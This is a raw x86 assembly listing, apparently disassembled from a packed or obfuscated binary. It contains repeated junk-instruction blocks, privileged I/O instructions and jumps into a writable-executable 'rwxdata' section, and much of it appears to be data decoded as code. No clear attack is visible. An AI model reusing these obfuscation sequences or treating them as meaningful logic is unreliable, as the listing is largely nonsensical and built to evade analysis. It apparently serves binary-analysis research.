sar [ edi ] 0x1
add [ edx ] dh
or al 0xd7
call 0x7e82a5e0
jg rwxdata
sub_10207124
clc
call sub_10116553
0xe897b08f 0xf06e
add [ eax - 0x1bce30a2 ] eax
fwait
lodsd [ esi ]
dec esi
mov al 0x57
mov ch al
pop ecx
popad
mov ebp 0x851aa5ba
sbb [ ebp - 0x5ee17ec3 ] eax
dec ebp
int1
mov eax [ 0xffffffffa97dc23d ]
xchg esi eax
sbb ebp edx
fadd st7
mov edx 0x40e97604
push ds
cmp [ edi ] al
dec eax
mov [ esi ] edx
imul ebx [ ecx + 0x74389f2a ] 0xffffffff
aas
out 0x97 eax
test al 0x22
0xca487e1 0xd493
salc
jmp rwxdata
sub_102074aa
mov esp esi
pushfd
pushad
lea esp [ esp + 0x24 ]
jmp rwxdata
movsx dx al
je rwxdata
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_10207755
lea esp [ esp + 0x2c ]
je rwxdata
btc edi 0xc
not al
xor cl al
mov edi edx
xchg ch al
shrd cx bp cl
ror al 0x1
mov ecx edi
rcr al cl
cmc
mov al [ ecx ]
cmp si 0x4446
pushfd
pushad
mov ah al
clc
cmp bl 0xed
sub al 0xc7
mov [ esp + 0x4 ] dh
cmc
jmp sub_101599d3
push 0x279bc74f
cmp cl 0xe3
sub al 0x30
pushfd
test cl 0xf0
pushfd
cmp al 0x9
call sub_101468d0
sub_10207775
mov [ esp ] 0xab12
test al al
pushad
call sub_10207755
pushfd
call j_sub_1014b104
pushfd
jmp rwxdata
lea esp [ esp + 0x1c ]
je rwxdata
movsx dx al
je rwxdata
push esi
stc
call sub_102000b2
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_10207878
lea eax [ rwxdata ]
push 0xe5272294
mov [ esp ] 0x7e
pushad
mov [ esp ] sp
lea esp [ esp + 0x24 ]
jmp rwxdata
call sub_1014c566
mov edx 0xf8e6bc23
loop rwxdata
shl edi cl
dec di
mov edi [ ebx + ecx * 4 ]
bswap esi
btc si sp
clc
add edi eax
pushad
call sub_1011dfcc
call sub_1011e8f7
call sub_10147230
stc
cmp cl ch
sub ecx ebx
jmp rwxdata
and ecx [ edx ]
mov edi 0x97a883c5
das
iretd
push 0xfd272457
lea esp [ esp + 0x4 ]
jne rwxdata
push edx
push edx
xchg ecx eax
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_1014c55d
pushfd
push 0x64680a47
lea esp [ esp + 0x8 ]
jmp rwxdata
jmp rwxdata
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
pushfd
dec eax
pushfd
shl eax 0x8
not al
push 0x3695820c
pushfd
lodsb [ esi ]
push 0xe3e5c175
cmc
not al
cmc
sub al 0x59
push 0x5d658544
pushfd
neg al
pushad
bt sp 0x6
clc
mov [ esp + 0x4 ] 0x1335
sub al 0x9d
push 0x6a86e1a5
jmp rwxdata
lea esp [ esp + 0x48 ]
call sub_1014c55d
push ecx
push 0x686be2cd
cmp eax 0x7d00
lea esp [ esp + 0x8 ]
jge rwxdata
pushad
pushfd
mov [ esp + 0x4 ] 0xe3
lea esp [ esp + 0x24 ]
jae rwxdata
jae rwxdata
pushad
inc ecx
lea esp [ esp + 0x20 ]
push 0xbfe735f8
inc ecx
add esp 0x4
rcl bl cl
cmc
xchg ebp eax
pushad
call j_sub_1011701f
stosb [ edi ]
enter 0x71ee 0x75
imul edi [ edx + 0x3a ] 0xda6e4938
add eax 0xd185ba99
lea edi [ ecx ]
lds ebp [ ecx - 0x44f02f8a ]
arpl [ eax ] di
inc edi
jmp rwxdata
clc
push 0x496c45e7
jmp sub_10117f5e
sti
inc esp
push ecx
insd
enter 0xa076 0xbe
push edx
insd
push ebp
dec edx
retn
sub_1020799d
pushad
lea esp [ esp + 0x44 ]
je rwxdata
rol bx cl
mov bl 0xb6
test dh dh
btc bx dx
mov bx [ esi ]
clc
stc
jmp rwxdata
pushfd
test sp ax
bt ax bp
mov [ esp ] 0x27
cmp ebx 0x3
mov [ esp ] 0xa5
mov [ esp ] ch
lea esp [ esp + 0x4 ]
je rwxdata
jmp rwxdata
pushfd
inc bl
sub bh al
mov bx [ esi ]
pushfd
cmp si dx
stc
and ebx 0xfff
call j_sub_102057d4
in eax 0x20
[ eax + 0x27 ]
push esp
dec ebx
pop esp
add bh [ edx + 0x1 ]
mov [ 0xffffffff83c45aa5 ] eax
cld
push ss
dec eax
add bl [ esi + edx * 4 + 0x1acd2a8 ]
add al 0xbf
and [ edi + 0x8 ] dl
mov dl [ edx + ecx * 2 + 0x54 ]
mov ax 0xa877
sti
pushad
lea esp [ esp + 0x20 ]
jmp rwxdata
and ebx 0xfff
bt dx sp
jmp rwxdata
jmp rwxdata
pushfd
bt bp sp
add [ ebx + edi ] dx
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
add esi 0x2
jmp rwxdata
pushad
pushad
pushfd
dec ecx
push esi
lea esp [ esp + 0x48 ]
jne rwxdata
btc bx 0x8
bswap bx
clc
jmp rwxdata
seto cl
bt bp 0x1
xor cl ah
mov ecx [ ebp - 0x4 ]
pushfd
bt bx 0xc
cmp [ ebp + 0x14 ] ecx
jmp sub_10115b2d
mov bx [ esi ]
pushad
shr ebx 0xc
bt dx 0x6
bt dx cx
cmp ebx 0x1
call sub_1020bc51
movsb [ edi ] [ esi ]
cmp al 0xc2
ror [ esi ] 0x1
sub_10207ea9
mov [ esp ] eax
push edx
lodsb [ esi ]
cmp dl ah
test bl cl
xor al 0x72
stc
mov [ esp ] 0x1b657e23
pushfd
clc
rol al 0x6
clc
clc
pushad
bt ax bx
not al
pushfd
bt ax 0x9
add al 0xc7
jmp rwxdata
mov [ esp ] ebp
bt bp 0x6
push edi
cmp al [ edi ]
bswap eax
lea eax [ edx - 0x668c5e7c ]
cwde
mov [ esp ] 0x87
lea edi [ edi + 0x1 ]
jmp rwxdata
pushfd
mov eax [ esp + 0x34 ]
jmp rwxdata
lea esp [ esp + 0x38 ]
ja rwxdata
jae rwxdata
call sub_10146fce
cmp eax 0x3b833fa0
stosd [ edi ]
xor ecx [ eax - 0x4882180 ]
xchg esp eax
outsd
fst [ edx - 0x13 ]
fld [ ecx + 0x5a ]
and eax 0x99a54956
jno rwxdata
push 0xf5564d03
cmp ecx [ ebp - 0x4 ]
call sub_1014be53
call sub_10201415
push ecx
mov ah 0x6b
lahf
pop edi
xor [ edi - 0x138e0760 ] cl
dec eax
add [ ebx + 0xc ] dh
scasb [ edi ]
jo rwxdata
stc
cmp ecx [ ebp - 0x4 ]
push ebp
call sub_10204bf9
mov dh 0x97
enter 0xa41b 0x4d
mov eax 0x497d460c
fsubr [ eax + ebx * 8 + 0x67 ]
in al dx
push ebx
mov ebx 0xff7f6063
mov edi 0x9c42603f
stosd [ edi ]
aam 0x2c
0x26f9e894 0x86c1
and eax 0x3feefbec
arpl sp bx
xor [ eax + 0x70 ] ch
push cs
test [ esi ] ah
mov [ 0x1c22ecdb ] eax
shr [ ebp + edi * 2 + 0x3d ] cl
push 0x75
sub [ esi + 0x2b ] edx
xchg ebx eax
sbb eax 0xd904bbe8
and eax 0x710bfae5
pop ebx
cwde
or [ esi + 0x39f9a579 ] eax
shr cl 0x1
inc ebx
sub al 0x0
add [ esi - 0x77 ] ah
and al 0x24
test di si
mov [ esp ] cx
sub ecx ecx
push [ esp ]
call sub_101469a8
push esi
imul edi [ ebp - 0x21f2ae3f ] 0x9e691641
inc ecx
test al 0x36
inc edi
cli
and eax 0xf5643a36
and bh [ ebp + edx - 0x3 ]
sub dh [ ebp + eax * 8 + 0x2e0e4a9b ]
xchg edi eax
dec ebx
mov edx 0xdd61fdfb
rcr ebp 0xc1
daa
xor esi [ ecx - 0x156bd839 ]
xchg [ edi ] edx
dec eax
jpe rwxdata
pop es
adc al 0xb5
enter 0xc01e 0xb7
in al 0xe
dec [ ebp - 0x1c80b80e ]
les ebx [ ebx ]
sub esi [ edi + ebx * 2 + 0x28e955e0 ]
mul [ ebx - 0x5 ]
push ss
or [ ecx ] bl
jno rwxdata
sar esi 0xa0
fcomip st0
fisub [ ebp + 0x4e ]
push ecx
mov ecx 0xf1227d45
in eax dx
inc ebp
fidiv [ eax - 0x11 ]
mov bl 0xc
sbb eax 0x24f5e4db
mov ebx 0x8900fdb
retn 0xde20
scasd [ edi ]
mov eax 0x9e830ee4
xchg esp ecx
mov dh 0x98
pop edi
pop esi
enter 0xc63 0x54
das
cmpsb [ esi ] [ edi ]
sar [ ebx + 0x144e5b7 ] cl
aaa
inc edi
mov [ 0xffffffff85b3a7b5 ] al
0x606d
sbb bl [ ecx - 0x7b ]
aaa
dec esp
dec ebx
push esp
outsd
jo rwxdata
jmp rwxdata
xchg edi eax
in al 0xab
pop eax
lea sp [ esp + 0x8 ]
jae rwxdata
test al 0x22
cld
push ss
dec eax
xor cl [ esi + esi * 2 + 0x48 ]
xchg ebp eax
or [ edx + 0x2d ] esi
xchg edx eax
or eax 0x30affd22
test edx eax
jl rwxdata
cmp eax 0xb7c01ec8
test esp esi
push ecx
in eax dx
inc ecx
les ecx [ edi + 0x6b03823c ]
xor al 0x9b
stosd [ edi ]
jle rwxdata
nop
movsx dx al
je rwxdata
push eax
cmp cl 0x5
pushad
jmp rwxdata
mov ch 0x71
pop ebx
in eax dx
pop edi
xor [ ebx ] bl
jecxz rwxdata
fdiv st3
sub al 0x81

inc edi
pop eax
mov es cx
or dh [ esp + edx * 4 - 0x4aebf804 ]
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
add ecx 0x1
pushfd
call sub_10116e27
jpo rwxdata
btc ebx ebx
pushfd
mov ebx eax
jmp rwxdata
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
xor ch dl
jle rwxdata
cmp [ ecx - 0x6b ] cl
scasb [ edi ]
popfd
out dx eax
push 0x37
xchg ecx eax
pushfd
mov edi 0x29ad9c83
push ds
ror [ 0x42f0b25e ] 0x1
push es
sub [ 0x59851302 ] edi
fisubr [ ecx - 0xd ]
add eax 0x44b5921b
0xc7029d85 0x4b73
clc
cmp al 0xaf
cmp [ edi ] 0x23
pushfd
lea esp [ esp + 0x8 ]
jne rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
xchg edi eax
add [ ebx ] 0x2f
scasd [ edi ]
cmp al 0x8f

xchg ebx eax
loope rwxdata
push cs
mov dl 0x6c
mov ebx 0x39e45bec
loopne rwxdata
xchg ch al
shrd cx bp cl
ror al 0x1
mov ecx edi
rcr al cl
cmc
mov al [ ecx ]
cmp si 0x4446
pushfd
pushad
mov ah al
clc
cmp bl 0xed
sub al 0xc7
mov [ esp + 0x4 ] dh
cmc
jmp sub_101599d3
sar ax 0xd
bts ax 0x1
sub edx edx
movsx ax bl
daa
sbb ax dx
aas
mov eax edx
dec al
test bl 0xe2
or al cl
add edi 0x1
and al 0x5f
adc al 0xd7
mov al [ edi ]
cmp eax edx
test al al
jmp rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
les edi [ edx - 0x5f50611f ]
mov dl 0x1e
fiadd [ ecx + 0x22ea95aa ]
xchg dl ch
xchg esp eax
jmp 0xffffffff9c0c8ab9
inc [ edi - 0x68 ]
sbb eax esp
mov edx 0xcc1e7f74
jg rwxdata
inc edi
cwde
je rwxdata
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
retn 0xc391
sti
dec eax
xchg ebp eax
mov edx 0x838ad5a5
jpo rwxdata
btc edi 0xc
not al
xor cl al
mov edi edx
stc
jmp rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
clc
stc
sub al 0x30
call sub_1014781a
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_10208269
cmp ecx [ ebp - 0x8 ]
lea esp [ esp + 0xc ]
js rwxdata
push 0x353c6cd7
lea esp [ esp + 0x4 ]
jbe rwxdata
call sub_10203d90
and al dl
pop esp
mov dl [ edx + ecx * 4 - 0x4c ]
cmc
mov [ esi ] esi
cld
cmp eax 0x25df256
add [ esi + 0x1d ] bl
adc [ eax ] 0x2f
xchg ebx eax
sub esi [ ebx + 0x2b ]
movsx dx al
je rwxdata
btc esi esp
dec di
sub ecx 0x1
mov esi ecx
bsr edi edx
mov [ ebp - 0x4 ] ecx
sbb ch cl
bt si dx
xchg di si
sub ecx 0x9b8a8499
mov ecx [ ebp - 0x8 ]
xchg edi esi
movzx si al
add ecx [ ebp - 0x4 ]
shr di cl
bsf si sp
shr si cl
shr ecx 0x1
add di sp
mov edi [ ebx + ecx * 4 ]
bt eax esi
movzx si bl
add edi eax
jmp rwxdata
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
movsx si al
mov esi [ ebp + 0xc ]
jmp sub_10201df6
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_102086f2
sar ch cl
mov ecx 0x104
cmc
sub al al
push [ esp + 0x4 ]
jmp rwxdata
bt ebp 0x19
[ edi ]
jmp rwxdata
lea esp [ esp + 0xc ]
jne rwxdata
movsx dx al
je rwxdata
inc si
shl ecx cl
shl cl 0x1
bsr si ax
mov ecx edi
add esi 0xd4d5c2ba
bts si 0xf
sar si cl
test bh 0x84
sub ecx ebx
movzx si cl
not si
mov esi esp
pushad
jmp rwxdata
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
pushad
stc
sub edi 0x4
mov [ esp + 0x8 ] 0x60
push [ edi ]
pop [ esp + 0x3c ]
call sub_101180a5
mov cl 0xb
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
insd
retn 0xe8f7
jno rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
rol [ eax + 0x200fafbf ] cl
xchg ebp eax
dec ebx
add al 0xc8
cmp [ edi - 0x61 ] 0x3b
inc esp
jpo rwxdata
sbb [ esi + 0x679e53ab ] 0x27b84f10
mov esp 0x93e79803
jmp rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_10208dbc
call sub_10156d9f
pop ecx
mov ebp 0x52cd621d
cmpsb [ esi ] [ edi ]
dec ebx
adc eax edx
mov edi 0xf10e3a54
sub eax 0xc1dd6d51
xor ch dl
cmp ebp esp
mov ebp 0x52ed7921
xchg ebx eax
sub ebp edx
sub eax 0xa401f0af
pop edx
outsb
mov ecx 0xd4f30545
mov dh 0x83
mov eax [ 0xffffffffd913dda2 ]
add [ 0xfffffffff59a58ef ] bh
[ eax + 0x67 ]
mov [ 0x6367d75b ] eax
mov ebx 0xf38befb0
adc eax 0x94cb7a69
jmp 0x4f33d42
sub_102090e3
pushad
pushfd
lea esp [ esp + 0x28 ]
ja rwxdata
clc
pushfd
clc
call sub_102010f5
rcl edi 0xe7
nop
iretd
call sub_1014be2b
inc ebx
xor [ ebp + 0xd ] ebp
jno rwxdata
retn 0xeddc
xchg ecx eax
pop ss
jns rwxdata
or eax 0x9fbf32f1
push ebx
in eax dx
mov bl 0x2d
sbb eax 0xd3d22ce1
or ecx [ edx - 0x27a19eab ]
xchg edi ecx
jo rwxdata
pop esp
call 0xffffffff9e842c64
ja rwxdata
jecxz rwxdata
rcr [ edi + 0x364717ff ] cl
dec eax
pop ecx
mov cl 0x2e
xor [ ecx + 0x5b ] 0x52
xchg edx eax
std
in eax 0x20
stosd [ edi ]
test al 0x97
xor ebp ebx
pop ss
inc edi
xchg ebx eax
in al dx
xchg ebp eax
adc cl ch
out dx eax
add bh [ edi + ebx * 4 ]
and [ edx ] 0xbc
pop es
fdivr [ edx - 0x12362a7b ]
shl bl cl
jo rwxdata
add bl ah
cld
fwait
mov al [ 0xffffffffc2cdb6f5 ]
fsub st5
out dx eax
dec ebx
push ebx
xchg esp eax
pop edx
in eax dx
dec ecx
mov eax 0x81cef3b8
mov esp 0xbd3cfaf
xchg edi eax
inc edi
out dx eax
jo rwxdata
jle rwxdata
lea eax [ eax - 0x11 ]
inc ebx
mov ebx 0x548a5cc3
push edx
mov edx fs
popfd
mov esp 0x37ce71a2
pop es
mov ebx 0x940db1e4
or bh al
daa
0x3b689634 0x9584
rcr [ edi + 0x21024db0 ] 0xfe
adc ah ah
enter 0xdefd 0x92
mov dl 0xbc
insb
dec edi
jecxz rwxdata
stc
sub dh ch
0x9fc0
jno rwxdata
test al dl
sbb eax 0x8857c281
sub esi [ ebp + eax * 8 + 0x73c42385 ]
push eax
0x3b12eb28 0x3f1c
add ebx [ eax + ebx * 8 ]
sub eax 0xcd129581
sub_102091cd
pushfd
pushfd
lea esp [ esp + 0x2c ]
je rwxdata
btc edi 0xc
not al
xor cl al
mov edi edx
xchg ch al
shrd cx bp cl
ror al 0x1
mov ecx edi
rcr al cl
cmc
mov al [ ecx ]
cmp si 0x4446
pushfd
pushad
mov ah al
clc
cmp bl 0xed
sub al 0xc7
mov [ esp + 0x4 ] dh
cmc
jmp sub_101599d3
clc
call sub_1011770d
mov [ esp + 0x4 ] al
push [ eax ]
pop [ esp + 0x44 ]
pushfd
pushfd
pushfd
push [ esp + 0x50 ]
retn 0x54
sub_1020948c
pushad
lea esp [ esp + 0x24 ]
ja rwxdata
push edi
pushad
call sub_10201207
pushfd
push [ esp ]
call sub_1015974d
or [ ebx ] esp
cmp esi edi
inc edi
insb
jae rwxdata
aas
pushad
sbb eax [ edx + ebp * 2 + 0x2797c6b5 ]
js rwxdata
js rwxdata
jpe rwxdata
push ebp
mov al 0x8e

adc [ ecx ] ebp
movsb [ edi ] [ esi ]
0x6955
mov [ esi + ebx * 8 + 0x28f71076 ] al
adc [ cs : ecx ] ebp
xchg edi eax
daa
adc esi ebx
push ebp
lea edi [ eax - 0x45 ]
sub_102096ea
lea esp [ esp + 0xc ]
jae rwxdata
movsx dx al
je rwxdata
push 0x33493e64
pushad
pushad
lea esp [ esp + 0x44 ]
jmp rwxdata
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
jmp rwxdata
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
